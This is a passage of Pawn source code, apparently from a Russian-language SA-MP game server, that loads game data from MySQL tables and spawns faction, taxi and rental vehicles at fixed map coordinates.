	mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_KVARTIRS"`",true,"OnMySQL_QUERY","iis",8,-1,"");
	mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_PODEZDS"`",true,"OnMySQL_QUERY","iis",9,-1,"");
	mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_CASINO"`",true,"OnMySQL_QUERY","iis",10,-1,"");
	mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_OTHERS"`",true,"OnMySQL_QUERY","iis",0,-1,"");
	mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_ATM"`",true,"OnMySQL_QUERY","iis",22,-1,"");
	mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_FARM"`",true,"OnMySQL_QUERY","iis",28,-1,"");
	mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_STALL"`",true,"OnMySQL_QUERY","iis",31,-1,"");
	mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_GANGZONE"`",true,"OnMySQL_QUERY","iis",32,-1,"");
	mysql_function_query(DATABASE,"SELECT * FROM `grating`",true,"OnMySQL_QUERY","iis",55,-1,"");
	////////////////  Создание альтернативных команд /////////////////
	// Разбан аккаунтов
	mysql_function_query(DATABASE,"SELECT * FROM `"TABLE_BAN"`",true,"OnMySQL_QUERY","iis",26,-1,"");
	mysql_function_query(DATABASE,"UPDATE `"TABLE_ACCOUNTS"` SET `progolos` = '0', pMin = '0'", false, "","");
	// Анти-чит
    mysql_function_query(DATABASE, "SELECT * FROM `AntiCheat`",true,"LoadSettings","");
    
	if(!strcmp(GetDay(), "Понедельник", true))
	{
	    mysql_function_query(DATABASE,"UPDATE `"TABLE_ACCOUNTS"` SET pChas = '0'", false, "","");
	}
	
	printf("Загрузка завершена!");
	return true;
}
stock CreateVehicles()
{
    maxMats[gBallas] = 3000;
	maxMats[gVagos] = 3000;
	maxMats[gGrove] = 3000;
 	maxMats[gAztek] = 3000;
	maxMats[gRifa] = 3000;
	switch(BestGang)
	{
	    case 12: maxMats[gBallas] 	*= 2;
	    case 13: maxMats[gVagos] 	*= 2;
	    case 15: maxMats[gGrove]	*= 2;
	    case 17: maxMats[gAztek] 	*= 2;
	    case 18: maxMats[gRifa] 	*= 2;
	}
	buscar[0] = CreateVehicle(437,1277.0209960938,-1795.6282958984,13.64319229126,90,86,86,300);//Автобус (внутригородской ЛС)
	CreateVehicle(437,1277.0209960938,-1802.1025390625,13.64319229126,90,86,86,300);//Автобус (внутригородской ЛС)
	CreateVehicle(437,1277.0209960938,-1808.5930175781,13.64319229126,90,86,86,300);//Автобус (внутригородской ЛС)
	CreateVehicle(437,1277.0209960938,-1814.8427734375,13.64319229126,90,86,86,300);//Автобус (внутригородской ЛС)
	CreateVehicle(437,1277.0209960938,-1820.8427734375,13.64319229126,90,86,86,300);//Автобус (внутригородской ЛС)
	CreateVehicle(437,1277.0209960938,-1827.0927734375,13.64319229126,90,86,86,300);//Автобус (внутригородской ЛС)
	CreateVehicle(437,1239.6343994141,-1817.5446777344,13.672597885132,180,86,86,300);//Автобус (внутригородской ЛС)
	buscar[1] = CreateVehicle(437,1277.0209960938,-1833.3366699219,13.64319229126,90,86,86,300);//Автобус (внутригородской ЛС)
	buscar[2] = CreateVehicle(437,-1967.0225830078,104.88460540771,27.9375,90,6,6,300);//Автобус (внутригородской Сф)
	CreateVehicle(437,-1967.0225830078,99.884094238281,27.9375,90,6,6,300);//Автобус (внутригородской Сф)
	CreateVehicle(437,-1967.0225830078,94.33415222168,27.9375,90,6,6,300);//Автобус (внутригородской Сф)
	CreateVehicle(437,-1967.0225830078,89.08430480957,27.9375,90,6,6,300);//Автобус (внутригородской Сф)
	buscar[3] = CreateVehicle(437,-1967.0225830078,83.085815429688,27.9375,90,6,6,300);//Автобус (внутригородской Сф)
	buscar[4] = CreateVehicle(437,2764.0932617188,1293.1108398438,11,180,18,18,300);//Автобус (внутригородской ЛВ)
	CreateVehicle(437,2769.3427734375,1293.1108398438,11,180,18,18,300);//Автобус (внутригородской ЛВ)
	CreateVehicle(437,2775.0703125,1293.1108398438,11,180,18,18,300);//Автобус (внутригородской ЛВ)
	CreateVehicle(437,2780.5703125,1293.1108398438,11,180,18,18,300);//Автобус (внутригородской ЛВ)
	CreateVehicle(437,2785.8203125,1293.1108398438,11,180,18,18,300);//Автобус (внутригородской ЛВ)
	CreateVehicle(437,2790.8950195313,1293.1108398438,11,180,18,18,300);//Автобус (внутригородской ЛВ)
	buscar[5] = CreateVehicle(437,2796.2651367188,1293.1108398438,11,180,18,18,300);//Автобус (внутригородской ЛВ)
	buscar[6] = CreateVehicle(431,1675.3450927734,-1129.1733398438,24.15625,90,2,126,300);//Автобус (Меж городской)
	CreateVehicle(431,1675.3450927734,-1124.7479248047,24.15625,90,2,126,300);//Автобус (Меж городской)
	CreateVehicle(431,1675.3450927734,-1120.4718017578,24.15625,90,2,126,300);//Автобус (Меж городской)
	CreateVehicle(431,1675.3450927734,-1115.8715820313,24.15625,90,2,126,300);//Автобус (Меж городской)
	CreateVehicle(431,1675.3450927734,-1111.6203613281,24.15625,90,2,126,300);//Автобус (Меж городской)
	CreateVehicle(431,1675.2983398438,-1107.0950927734,24.15625,90,2,126,300);//Автобус (Меж городской)
	CreateVehicle(431,1675.3450927734,-1102.6440429688,24.15625,90,2,126,300);//Автобус (Меж городской)
	buscar[7] = CreateVehicle(431,1675.3450927734,-1098.1450195313,24.15625,90,2,126,300);//Автобус (Меж городской)
	//============================== MEDICS SF =================================
	medicssf[0] = CreateVehicle(416,-2667.0894,614.2082,14.6278,181.1619,1,3,300); //
	medicssf[1] = CreateVehicle(416,-2662.3877,614.3588,14.6395,178.8490,1,3,300); //
	medicssf[2] = CreateVehicle(416,-2657.6091,614.4506,14.6532,179.6371,1,3,300); //
	medicssf[3] = CreateVehicle(416,-2652.7881,614.2981,14.6467,179.8118,1,3,300); //
	medicssf[4] = CreateVehicle(416,-2644.8718,614.2336,14.5154,180.2280,1,3,300); //
	medicssf[5] = CreateVehicle(416,-2639.3708,614.4089,14.5413,180.5666,1,3,300); //
	medicssf[6] = CreateVehicle(416,-2633.3655,614.0867,14.5413,179.5042,1,3,300); //
	medicssf[7] = CreateVehicle(561,-2654.2410,599.3944,14.2134,179.9998,3,1,300); //
	medicssf[8] = CreateVehicle(561,-2658.3591,599.4279,14.2350,179.9999,3,1,300); //
	medicssf[9] = CreateVehicle(561,-2662.2312,599.4658,14.2265,179.8246,3,1,300); //
	medicssf[10] = CreateVehicle(561,-2666.2554,599.4199,14.2354,175.8854,3,1,300); //
	medicssf[11] = CreateVehicle(561,-2670.3159,599.3124,14.2134,179.9998,3,1,300); //
	medicssf[12] = CreateVehicle(487,-2728.9033,612.0590,33.4486,90.0014,1,3,300); //
	medicssf[13] = CreateVehicle(487,-2728.8518,593.8652,33.4667,90.0064,1,3,300); //
	//================================ MEDICS LS ===============================
	medicsls[0] = CreateVehicle(416,1178.5853,-1338.7312,14.0452,270.0753,1,3,300); //
	medicsls[1] = CreateVehicle(416,1178.0670,-1308.9407,14.0320,268.0979,1,3,300); //
	medicsls[2] = CreateVehicle(416,1124.3884,-1327.6526,13.5133,359.7627,1,3,300); //
	medicsls[3] = CreateVehicle(416,1111.1395,-1328.2522,13.4496,0.2669,1,3,300); //
	medicsls[4] = CreateVehicle(416,1097.8245,-1329.0574,13.3941,0.2991,1,3,300); //
	medicsls[5] = CreateVehicle(487,1163.2595,-1305.9376,31.7142,357.5895,1,3,300); //
	medicsls[6] = CreateVehicle(416,2035.3899,-1421.4652,17.1995,93.6311,1,3,300); //
	medicsls[7] = CreateVehicle(416,2035.1235,-1416.8785,17.0328,97.1984,1,3,300); //
	medicsls[8] = CreateVehicle(416,2025.8784,-1412.5417,17.1414,147.6726,1,3,300); //
	medicsls[9] = CreateVehicle(416,2021.2214,-1411.1987,17.1415,139.4020,1,3,300); //
	//================================ MEDICS LV ===============================
	medicslv[0] = CreateVehicle(416,1620.1746,1849.0984,10.9770,178.5422,1,3,300); //
	medicslv[1] = CreateVehicle(416,1615.7095,1849.0826,10.9204,175.9977,1,3,300); //
	medicslv[2] = CreateVehicle(416,1610.7651,1849.1069,10.9895,178.2377,1,3,300); //
	medicslv[3] = CreateVehicle(416,1606.3879,1849.2563,10.9216,178.9692,1,3,300); //
	medicslv[4] = CreateVehicle(416,1602.1953,1849.0099,10.9086,178.5605,1,3,300); //
	medicslv[5] = CreateVehicle(416,1598.0675,1848.9480,10.9138,179.0217,1,3,300); //
	medicslv[6] = CreateVehicle(416,1593.6991,1849.0450,11.0052,178.4418,1,3,300); //
	medicslv[7] = CreateVehicle(416,1589.5984,1848.9933,11.0115,180.2361,1,3,300); //
	medicslv[8] = CreateVehicle(487,1609.5964,1801.7544,30.6336,270.0012,1,3,300); //
	//================================ MEDICS FC ===============================
	medicsfc[0] = CreateVehicle(416,-304.4729,1036.0481,19.7425,269.5386,1,3,300); //
	medicsfc[1] = CreateVehicle(416,-304.4478,1032.0162,19.7428,269.6659,1,3,300); //
	medicsfc[2] = CreateVehicle(416,-304.3116,1027.8767,19.7428,269.8462,1,3,300); //
	medicsfc[3] = CreateVehicle(416,-304.4355,1023.7643,19.7431,269.9989,1,3,300); //
	medicsfc[4] = CreateVehicle(416,-304.5146,1020.0029,19.7428,270.5235,1,3,300); //
	medicsfc[5] = CreateVehicle(416,-304.4106,1015.9775,19.7432,269.0083,1,3,300); //
	medicsfc[6] = CreateVehicle(416,-304.0734,1011.7159,19.7431,271.4779,1,3,300); //
	medicsfc[7] = CreateVehicle(416,-304.1853,1007.5583,19.7427,270.8843,1,3,300); //
	//================================ SFPD ====================================
	sfpdcar[0] = CreateVehicle(597,-1600.4171,749.7671,-5.4677,179.9439,1,79,600); // SFPD1
	sfpdcar[1] = CreateVehicle(597,-1596.2659,749.7094,-5.4678,179.6262,1,79,600); // SFPD2
	sfpdcar[2] = CreateVehicle(597,-1592.2222,749.7622,-5.4724,180.8699,1,79,600); // SFPD3
	sfpdcar[3] = CreateVehicle(597,-1588.1238,749.7769,-5.5354,180.4540,1,79,600); // SFPD4
	sfpdcar[4] = CreateVehicle(597,-1584.0605,749.8477,-5.5348,179.8274,1,79,600); // SFPD5
	sfpdcar[5] = CreateVehicle(597,-1572.8368,730.8800,-5.4520,89.5223,1,79,600); // SFPD6
	sfpdcar[6] = CreateVehicle(597,-1572.8754,726.6901,-5.4520,88.7359,1,79,600); // SFPD7
	sfpdcar[7] = CreateVehicle(597,-1572.8942,722.3899,-5.5335,89.5058,1,79,600); // SFPD8
	sfpdcar[9] = CreateVehicle(597,-1572.9318,718.2077,-5.5258,88.7286,1,79,600); // SFPD9
	sfpdcar[10] = CreateVehicle(597,-1572.8405,706.1169,-5.5335,90.3532,1,79,600); // SFPD10
	sfpdcar[11] = CreateVehicle(523,-1595.8666,693.0551,-5.6864,178.7736,1,1,600); // SFPD ????1
	sfpdcar[12] = CreateVehicle(523,-1599.9996,692.9003,-5.6695,180.3339,1,1,600); // SFPD ????2
	sfpdcar[13] = CreateVehicle(523,-1595.9843,676.0793,-5.6692,1.2197,1,1,600); // SFPD ????3
	sfpdcar[14] = CreateVehicle(427,-1604.3055,692.7415,-5.0913,178.9770,1,79,600); // SFPD ????????
	sfpdcar[15] = CreateVehicle(427,-1608.3080,692.6514,-5.0913,179.9848,1,79,600); // SFPD ????????1
	//============================== RUSSIAN MAFIA =============================
	ruscar[0] = CreateVehicle(487,956.0000000,1753.9000200,8.9000000,230.0000000,0,0,600); // RM Helicopter 0
	ruscar[1] = CreateVehicle(409,950.2000100,1714.8000500,8.6000000,180.0000000,0,0,600); // Stretch 0
	ruscar[2] = CreateVehicle(580,955.5999800,1706.0999800,8.8000000,270.5000000,0,0,600); // Stafford 0
	ruscar[3] = CreateVehicle(580,964.5000000,1706.0999800,8.6000000,270.5000000,0,0,600); // Stafford 1
	ruscar[4] = CreateVehicle(579,983.5999800,1720.1999500,8.8000000,90.0000000,0,0,600); // RM HUNTLEY 0
	ruscar[5] = CreateVehicle(579,983.5999800,1723.9000200,8.8000000,90.0000000,0,0,600); // RM HUNTLEY 1
	ruscar[6] = CreateVehicle(579,983.5999800,1727.5000000,8.8000000,90.0000000,0,0,600); // RM HUNTLEY 2
	ruscar[7] = CreateVehicle(579,983.5999800,1731.3000500,8.8000000,90.0000000,0,0,600); // RM HUNTLEY 3
	ruscar[8] = CreateVehicle(579,983.5999800,1735.1999500,8.8000000,90.0000000,0,0,600); // RM HUNTLEY 4
	ruscar[9] = CreateVehicle(579,983.5999800,1739.0000000,8.7000000,90.0000000,0,0,600); // RM HUNTLEY 5
	ruscar[10] = CreateVehicle(579,983.5999800,1742.8000500,8.7000000,90.0000000,0,0,600); // RM HUNTLEY 6
	ruscar[11] = CreateVehicle(579,983.5999800,1746.6999500,8.7000000,90.0000000,0,0,600); // RM HUNTLEY 7
	ruscar[12] = CreateVehicle(468,967.9000200,1758.6999500,8.4000000,204.0000000,23,23,600); // Sanchez 0
	ruscar[13] = CreateVehicle(468,965.5000000,1758.6999500,8.4000000,204.0000000,23,23,600); // Sanchez 1
	ruscar[14] = CreateVehicle(468,963.0999800,1758.6999500,8.4000000,204.0000000,23,23,600); // Sanchez 2
	//================================== LCN ===================================
	lcncar[0] =	CreateVehicle(487,1430.9761,788.0078,10.9634,179.1432,0,0,600); //
	lcncar[1] =	CreateVehicle(445,1499.1096,718.0834,10.6338,76.6296,0,0,600); //
	lcncar[2] =	CreateVehicle(409,1488.6741,719.4366,10.6796,88.5935,0,0,600); //
	lcncar[3] =	CreateVehicle(445,1477.7354,718.0064,10.6346,104.1920,0,0,600); //
	lcncar[4] =	CreateVehicle(445,1413.6323,743.1208,10.6349,269.9980,0,0,600); //
	lcncar[5] =	CreateVehicle(445,1413.6346,746.3062,10.6363,269.7026,0,0,600); //
	lcncar[6] =	CreateVehicle(445,1413.6475,749.6598,10.6231,269.3087,0,0,600); //
	lcncar[7] =	CreateVehicle(445,1413.6196,752.6877,10.7025,271.3052,0,0,600); //
	lcncar[8] =	CreateVehicle(445,1413.6320,755.9434,10.6229,269.6909,0,0,600); //
	lcncar[9] =	CreateVehicle(445,1413.6421,759.0889,10.6162,269.1068,0,0,600); //
	lcncar[10] = CreateVehicle(445,1413.6328,762.2538,10.6351,269.9231,0,0,600); //
	lcncar[11] = CreateVehicle(468,1412.8843,768.7118,10.4891,269.9999,228,228,600); //
	lcncar[12] = CreateVehicle(468,1412.8843,771.9448,10.4895,269.9999,228,228,600); //
	lcncar[13] = CreateVehicle(468,1412.8862,775.1153,10.4976,269.9998,228,228,600); //
	lcncar[14] = CreateVehicle(487,1430.9781,788.0097,10.9908,179.1447,0,0,600); //
	//=================================== SF NEWS ==============================
	cnncar[0] = CreateVehicle(582,-2031.1930,459.3309,35.2332,1.0561,1,16,600); // News Van 0
	cnncar[1] = CreateVehicle(582,-2022.5162,459.3569,35.2286,359.1067,1,16,600); // News Van 1
	cnncar[2] = CreateVehicle(582,-2056.8635,469.9971,35.2334,270.9870,1,16,600); // News Van 2
	cnncar[3] = CreateVehicle(582,-2052.0874,478.6587,35.2299,269.6934,1,16,600); // News Van 3
	cnncar[4] = CreateVehicle(582,-2051.2991,487.4715,35.2243,269.5258,1,16,600); // News Van 4
	cnnmav = CreateVehicle(488,-2055.2781,443.6082,139.7422,270.6632,1,16,600); // CNN maverick
	//=================================== TAXI =================================
	taxicar[0] = CreateVehicle(438,2805.6475,1325.9688,10.7589,270.1906,6,6,600); // TAXI LV 0
	taxicar[1] = CreateVehicle(438,2805.6365,1329.1567,10.7589,270.1906,6,6,600); // TAXI LV 1
	taxicar[2] = CreateVehicle(438,2805.6248,1332.6895,10.7589,270.1906,6,6,600); // TAXI LV 2
	taxicar[3] = CreateVehicle(438,2805.6140,1335.8807,10.7589,270.1906,6,6,600); // TAXI LV 3
	taxicar[4] = CreateVehicle(438,2805.6028,1339.1978,10.7589,270.1906,6,6,600); // TAXI LV 4
	taxicar[5] = CreateVehicle(438,2805.5916,1342.6688,10.7589,270.1906,6,6,600); // TAXI LV 5
	taxicar[6] = CreateVehicle(438,2805.5808,1345.8571,10.7588,270.1906,6,6,600); // TAXI LV 6
	taxicar[7] = CreateVehicle(438,2805.5686,1349.4170,10.7588,270.1906,6,6,600); // TAXI LV 7
	taxicar[8] = CreateVehicle(438,2805.5591,1352.3472,10.7588,270.1906,6,6,600); // TAXI LV 8
	taxicar[9] = CreateVehicle(438,2805.5486,1355.3315,10.7588,270.1906,6,6,600); // TAXI LV 9
	taxicar[10] = CreateVehicle(438,2805.5378,1358.5138,10.7588,270.1906,6,6,600); // TAXI LV 10
	taxicar[11] = CreateVehicle(438,2805.5266,1361.8738,10.7588,270.1906,6,6,600); // TAXI LV 11
	taxicar[12] = CreateVehicle(438,2805.5168,1364.7805,10.7587,270.1906,6,6,600); // TAXI LV 12
	taxicar[13] = CreateVehicle(438,2805.5056,1368.1226,10.7587,270.1906,6,6,600); // TAXI LV 13
	taxicar[14] = CreateVehicle(438,2839.3208,1374.4399,10.7664,178.7267,6,6,600); // TAXI LV 14
	taxicar[15] = CreateVehicle(438,2842.7415,1374.3636,10.7837,178.7269,6,6,600); // TAXI LV 15
	taxicar[16] = CreateVehicle(438,2846.3364,1374.2836,10.8018,178.7269,6,6,600); // TAXI LV 16
	taxicar[17] = CreateVehicle(438,2849.2231,1374.2194,10.8163,178.7269,6,6,600); // TAXI LV 17
	taxicar[18] = CreateVehicle(420,1062.3927,-1775.5380,13.1120,270.7708,6,1,600); // TAXI LS 0
	taxicar[19] = CreateVehicle(420,1062.3916,-1771.6549,13.1255,270.0675,6,1,600); // TAXI LS 1
	taxicar[20] = CreateVehicle(420,1062.3931,-1767.7216,13.1423,268.9788,6,1,600); // TAXI LS 2
	taxicar[21] = CreateVehicle(420,1062.3938,-1763.6556,13.1586,270.6626,6,1,600); // TAXI LS 3
	taxicar[22] = CreateVehicle(420,1062.3945,-1759.5808,13.1749,270.8711,6,1,600); // TAXI LS 4
	taxicar[23] = CreateVehicle(420,1062.3937,-1755.5835,13.1945,269.6924,6,1,600); // TAXI LS 5
/*	taxicar[24] = CreateVehicle(420,1062.0664,-1757.6024,13.2499,269.9300,6,6,600); // TAXI LS 6
	taxicar[25] = CreateVehicle(420,1062.0704,-1754.6869,13.2409,269.9322,6,6,600); // TAXI LS 7
	taxicar[26] = CreateVehicle(420,1062.0726,-1751.6990,13.2605,269.9281,6,6,600); // TAXI LS 8
	taxicar[27] = CreateVehicle(420,1062.0757,-1748.7107,13.2629,269.9274,6,6,600); // TAXI LS 9
	taxicar[28] = CreateVehicle(420,1062.0771,-1745.7866,13.2691,269.9208,6,6,600); // TAXI LS 10*/
	taxicar[24] = CreateVehicle(420,-1976.7260,175.3114,27.4937,56.8506,6,1,600); // TAXI SF 0
	taxicar[25] = CreateVehicle(420,-1976.9633,179.6026,27.4687,58.8356,6,1,600); // TAXI SF 1
	taxicar[26] = CreateVehicle(420,-1976.7339,186.4631,27.4957,62.7047,6,1,600); // TAXI SF 2
	taxicar[27] = CreateVehicle(420,-1976.7123,191.9683,27.4807,66.5103,6,1,600); // TAXI SF 3
	taxicar[28] = CreateVehicle(420,-1976.1292,196.7620,27.3541,66.8474,6,1,600); // TAXI SF 4
	taxicar[29] = CreateVehicle(420,-1975.7725,203.2701,27.1523,64.5844,6,1,600); // TAXI SF 5
	taxicar[30] = CreateVehicle(420,-1984.5652,215.0136,27.4954,144.9371,6,1,600); // TAXI SF 6
	taxicar[31] = CreateVehicle(420,-1976.7355,183.0014,27.4672,60.1627,6,1,600); // TAXI SF 7
	taxicar[32] = CreateVehicle(420,-1990.6533,215.1601,27.4778,143.5870,6,1,600); // TAXI SF 8
	taxicar[33] = CreateVehicle(420,1803.9305,-1905.4001,13.1966,89.9990,6,1,600); // TAXI LS 13
	taxicar[34] = CreateVehicle(420,1803.9277,-1909.3995,13.1962,89.9988,6,1,600); // TAXI LS 14
	taxicar[35] = CreateVehicle(420,1803.9219,-1913.4241,13.1967,89.8085,6,1,600); // TAXI LS 15
	taxicar[36] = CreateVehicle(420,1803.9470,-1917.3995,13.2012,89.9994,6,1,600); // TAXI LS 16
	taxicar[37] = CreateVehicle(420,1803.9312,-1921.4016,13.1985,90.0021,6,1,600); // TAXI LS 17
	taxicar[38] = CreateVehicle(420,1803.9821,-1932.4327,13.1819,15.0030,6,1,600); // TAXI LS 18
	taxicar[39] = CreateVehicle(420,1799.9796,-1932.4283,13.1871,14.9969,6,1,600); // TAXI LS 19
	taxicar[40] = CreateVehicle(420,1795.9816,-1932.4347,13.1875,14.9970,6,1,600); // TAXI LS 20
	taxicar[41] = CreateVehicle(420,1791.9828,-1932.4419,13.1913,14.9966,6,1,600); // TAXI LS 12
	taxicar[42] = CreateVehicle(420,1787.9829,-1932.4420,13.1912,14.9965,6,1,600); // TAXI LS 12
	taxicar[43] = CreateVehicle(420,1783.9822,-1932.4375,13.1933,14.9990,6,1,600); // TAXI LS 12
	taxicar[44] = CreateVehicle(420,1779.9976,-1932.4902,13.1954,14.9995,6,1,600); // TAXI LS 12
	taxicar[45] = CreateVehicle(420,1775.9952,-1932.4894,13.1948,15.0157,6,1,600); // TAXI LS 12
	taxicar[46] = CreateVehicle(420,-1656.1839600,1314.0269775,6.8889999,133.9998779,6,1,600); //Taxi
	taxicar[47] = CreateVehicle(420,-1652.9320068,1310.6180420,6.8829999,133.9947510,6,1,600); //Taxi
	taxicar[48] = CreateVehicle(420,-1649.1479492,1306.8280029,6.8800001,133.9947510,6,1,600); //Taxi
	taxicar[49] = CreateVehicle(420,-1645.5739746,1303.3649902,6.8800001,133.9947510,6,1,600); //Taxi
	taxicar[50] = CreateVehicle(420,-1641.9200439,1299.7330322,6.8829999,133.9947510,6,1,600); //Taxi
	taxicar[51] = CreateVehicle(420,-1638.4880371,1296.1199951,6.8889999,133.9947510,6,1,600); //Taxi
	taxicar[52] = CreateVehicle(420,-2266.3059082,216.4299927,35.0139999,91.9947510,6,1,600); //Taxi
	taxicar[53] = CreateVehicle(420,-2266.2829590,212.5310059,35.0139999,91.9940186,6,1,600); //Taxi
	taxicar[54] = CreateVehicle(420,-2266.2858887,208.4400024,35.0139999,91.9940186,6,1,600); //Taxi
	taxicar[55] = CreateVehicle(420,-2266.2260742,204.4470062,35.0139999,91.9940186,6,1,600); //Taxi
	taxicar[56] = CreateVehicle(420,-2266.3479004,200.3609924,35.0139999,91.9940186,6,1,600); //Taxi
	taxicar[57] = CreateVehicle(420,-2266.4819336,196.5110016,35.0139999,91.9940186,6,1,600); //Taxi
	taxicar[58] = CreateVehicle(420,-2266.4938965,192.5180054,35.0139999,91.9940186,6,1,600); //Taxi
	taxicar[59] = CreateVehicle(420,-2266.5119629,188.6130066,35.0139999,91.9940186,6,1,600); //Taxi
	taxicar[60] = CreateVehicle(420,-2266.6550293,148.9179993,35.0139999,91.9940186,6,1,600); //Taxi
	taxicar[61] = CreateVehicle(420,-2266.7849121,144.9859924,35.0139999,91.9940186,6,1,600); //Taxi
	taxicar[62] = CreateVehicle(420,-2266.9040527,141.0339966,35.0070000,91.9940186,6,1,600); //Taxi
	taxicar[63] = CreateVehicle(420,-2266.9980469,137.0959930,35.0219994,91.9940186,6,1,600); //Taxi
	taxicar[64] = CreateVehicle(420,-2267.1789551,132.9909973,35.0219994,91.9940186,6,1,600); //Taxi
	taxicar[65] = CreateVehicle(420,-2267.0778809,129.0749969,35.0219994,91.9940186,6,1,600); //Taxi
	taxicar[66] = CreateVehicle(420,-2266.8840332,124.9879990,35.0219994,91.9940186,6,1,600); //Taxi
	taxicar[67] = CreateVehicle(420,-2267.1750488,121.0329971,35.0219994,91.9940186,6,1,600); //Taxi
	taxicar[68] = CreateVehicle(420,-2267.2661133,117.4410019,35.0219994,91.9940186,6,1,600); //Taxi
	//===============================Taxi 5 lvl================================
	taxi5lvlcar[0] = CreateVehicle(405,2452.0928,1345.6039,10.7218,360.0000,6,6,600); // taxi5lvl
	taxi5lvlcar[1] = CreateVehicle(405,2455.2854,1345.6040,10.7222,359.9941,6,6,600); // taxi5lvl
	taxi5lvlcar[2] = CreateVehicle(405,2458.5432,1345.6029,10.7238,0.0000,6,6,600); // taxi5lvl
	taxi5lvlcar[3] = CreateVehicle(405,2461.7390,1345.6027,10.7255,360.0000,6,6,600); // taxi5lvl
	taxi5lvlcar[4] = CreateVehicle(405,2464.9668,1345.6021,10.7256,0.0000,6,6,600); // taxi5lvl
	taxi5lvlcar[5] = CreateVehicle(405,2466.0000,1336.7303,10.7267,180.0000,6,6,600); // taxi5lvl
	taxi5lvlcar[6] = CreateVehicle(405,2462.5000,1336.7303,10.7267,180.0000,6,6,600); // taxi5lvl
	taxi5lvlcar[7] = CreateVehicle(405,2459.0000,1336.7303,10.7319,180.0000,6,6,600); // taxi5lvl
	taxi5lvlcar[8] = CreateVehicle(405,2455.5000,1336.7303,10.7266,180.0000,6,6,600); // taxi5lvl
	taxi5lvlcar[9] = CreateVehicle(405,2452.0000,1336.7303,10.7266,180.0000,6,6,600); // taxi5lvl
	for(new i = 0; i < 10; i++) police[taxi5lvlcar[i]] = CreateObject(19308,0,0,0,0,0,0,100.0), AttachObjectToVehicle(police[taxi5lvlcar[i]], taxi5lvlcar[i], 0.000000, -0.400000, 0.854999, 0.000000, 0.000000, 0.0);
	//===============================Taxi 10 lvl================================
	taxi10lvlcar[0] = CreateVehicle(560,2471.3752,1357.9017,10.5389,180.0000,6,6,600); // taxi10lvl
	taxi10lvlcar[1] = CreateVehicle(560,2468.1721,1357.9017,10.5388,180.0000,6,6,600); // taxi10lvl
	taxi10lvlcar[2] = CreateVehicle(560,2464.8149,1357.9017,10.5388,180.0000,6,6,600); // taxi10lvl
	taxi10lvlcar[3] = CreateVehicle(560,2461.6885,1357.9019,10.5384,180.0000,6,6,600); // taxi10lvl
	taxi10lvlcar[4] = CreateVehicle(560,2458.4102,1357.9019,10.5385,180.0000,6,6,600); // taxi10lvl
	taxi10lvlcar[5] = CreateVehicle(560,2441.0618,1350.0000,10.5205,270.0000,6,6,600); // taxi10lvl
	taxi10lvlcar[6] = CreateVehicle(560,2441.0625,1346.5000,10.5388,270.0000,6,6,600); // taxi10lvl
	taxi10lvlcar[7] = CreateVehicle(560,2441.0625,1343.0000,10.5387,270.0000,6,6,600); // taxi10lvl
	taxi10lvlcar[8] = CreateVehicle(560,2441.0625,1339.5000,10.5387,270.0000,6,6,600); // taxi10lvl
	taxi10lvlcar[9] = CreateVehicle(560,2441.0625,1336.0000,10.5388,270.0000,6,6,600); // taxi10lvl
	taxi10lvlcar[10] = CreateVehicle(560,2441.0625,1332.5000,10.5388,270.0000,6,6,600); // taxi10lvl
	for(new i = 0; i < 11; i++) police[taxi10lvlcar[i]] = CreateObject(19308,0,0,0,0,0,0,100.0), AttachObjectToVehicle(police[taxi10lvlcar[i]], taxi10lvlcar[i], -0.014999, -0.140000, 0.919999, -1.005000, 0.000000, 0.0);
	//===============================Taxi 40 lvl================================
	taxi40lvlcar[0] = CreateVehicle(402,2454.3059,1327.0875,10.6575,359.5276,6,6,600); // taxi40lvl
	taxi40lvlcar[1] = CreateVehicle(402,2450.8796,1327.1024,10.6573,359.8735,6,6,600); // taxi40lvl
	taxi40lvlcar[2] = CreateVehicle(402,2447.7275,1326.9869,10.6573,2.1801,6,6,600); // taxi40lvl
	taxi40lvlcar[3] = CreateVehicle(402,2441.3601,1353.9213,10.6573,268.7980,6,6,600); // taxi40lvl
	taxi40lvlcar[4] = CreateVehicle(402,2441.2283,1357.5021,10.6573,269.9194,6,6,600); // taxi40lvl
	taxi40lvlcar[5] = CreateVehicle(402,2452.0759,1357.9415,10.6573,179.6138,6,6,600); // taxi40lvl
	taxi40lvlcar[6] = CreateVehicle(402,2455.2197,1357.8628,10.6573,180.7671,6,6,600); // taxi40lvl
	//============================== Rent VIP ==================================
	rentcarvip[0] = CreateVehicle(409,356.7928,-1808.3760,4.3304,0.0249,1,1,600);
	rentcarvip[1] = CreateVehicle(409,353.6666,-1808.3795,4.3286,359.6000,0,0,600);
	rentcarvip[2] = CreateVehicle(562,350.3633,-1809.7119,4.1475,0.3427,35,1,600);
	rentcarvip[3] = CreateVehicle(562,347.1148,-1809.7987,4.1461,359.6031,17,1,600);
	rentcarvip[4] = CreateVehicle(560,344.0623,-1809.9899,4.1852,359.4391,9,39,600);
	rentcarvip[5] = CreateVehicle(560,340.8721,-1809.6970,4.2492,359.0866,17,1,600);
	rentcarvip[6] = CreateVehicle(489,337.3025,-1809.6433,4.5972,0.3293,14,123,600);
	rentcarvip[7] = CreateVehicle(489,334.1506,-1809.6102,4.5862,2.4724,120,123,600);
	rentcarvip[8] = CreateVehicle(480,330.8929,-1809.3428,4.2702,359.0356,12,12,600);
	//============================== Rent SF ===================================
	rentcarsf[0] = CreateVehicle(551,-1991.9255,241.9435,34.9883,298.3905,-1,-1,600); // Rent Car SF 0
	rentcarsf[1] = CreateVehicle(526,-1992.3762,246.0848,34.8838,295.0731,-1,-1,600); // Rent Car SF 1
	rentcarsf[2] = CreateVehicle(401,-1992.0844,250.5429,34.9218,301.5730,-1,-1,600); // Rent Car SF 2
	rentcarsf[3] = CreateVehicle(436,-1991.3379,255.3898,34.9733,298.7093,-1,-1,600); // Rent Car SF 3
	rentcarsf[4] = CreateVehicle(540,-1990.4432,260.1355,35.0935,297.0277,-1,-1,600); // Rent Car SF 4
	rentcarsf[5] = CreateVehicle(546,-1990.1090,264.9886,34.9433,295.3199,-1,-1,600); // Rent Car SF 5
	rentcarsf[6] = CreateVehicle(585,-1989.4005,270.0739,34.7749,286.5439,-1,-1,600); // Rent Car SF 6
	//============================= Rent LS ====================================
